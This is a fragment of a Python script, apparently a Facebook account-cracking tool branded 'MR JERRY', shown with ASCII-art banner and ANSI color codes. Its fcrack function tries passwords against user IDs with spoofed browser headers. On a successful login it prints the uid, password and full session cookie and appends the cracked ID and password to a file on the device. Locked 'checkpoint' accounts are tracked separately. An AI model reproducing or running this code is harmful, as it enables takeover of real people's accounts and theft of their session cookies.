...
\__    _/(  ____ \(  ____ )(  ____ )|\     /|
   ...
   |  |  | (      | (\ (   | (\ (      ) (   
|\_)  )  | (____/\| ) \ \__| ) \ \__   | |   
(____/   (_______/|/   \__/|/   \__/   \_/\033[1;37m 
\033[1;31m====================================================\033[1;37m
[â€¢] OWNER      : MR JERRY 
[â€¢] GITHUB     : NON USE 
[â€¢] STATUS     : FREE
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=4R4AZrbHIQ6XrugMsVqn8yAj; sb=4R4AZo9xhya8zcbcrZ98_eYo; m_pixel_ratio=3; ps_l=0; ps_n=0; wd=360x680; fr=0oYLxmQftMgy0sGp0..BmAB7h..AAA.0.0.BmAB8L.AWUS0qYPTlg',
    'dpr': '3',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR JERRY-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/JERRY-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[MR JERRY-CP] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('MR JERRY-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR JERRY\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
